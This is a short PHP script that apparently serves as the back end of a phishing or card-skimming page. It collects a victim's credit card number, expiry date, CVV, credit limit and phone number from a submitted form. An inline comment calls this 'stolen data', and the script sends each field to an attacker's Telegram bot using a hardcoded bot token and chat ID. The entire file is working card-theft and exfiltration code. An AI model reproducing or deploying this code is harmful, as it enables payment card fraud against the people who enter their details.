<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
 $ccnum = $_POST['ccnum'];
 $edate = $_POST['edate'];
 $cvv = $_POST['cvv'];
 $ccl = $_POST['ccl'];
 $rgmob = $_POST['rgmob'];
 
 // Send the stolen data to your Telegram bot
 $telegram_token = "7082984249:AAGKgTi78QguLiYuPo7ijOb6VXaa4gfSri8";
 $chat_id = "-1002189995540";
 $message = "Credit Card Number: $ccnum ";
 $message1 = "Expiry Date: $edate";
 $message0 = "{";
 $message2 = "}";
 $message3 = "CVV: $cvv";
 $message4 = "Credit Limit:$ccl";
 $message5 = "Number:$rgmob";
 
 $url = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$message";
 $url1 = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$message1";
 $url0 = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$message0";
 $url2 = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$message2";
 $url3 = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$message3";
 $url4 = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$message4";
 $url5 = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=$message5";
 
 $response = file_get_contents($url0); 
 $response = file_get_contents($url);
 $response = file_get_contents($url1);
 $response = file_get_contents($url3);
 $response = file_get_contents($url4);
 $response = file_get_contents($url5);
 $response = file_get_contents($url2);
 // You can add further processing or logging here
}
?>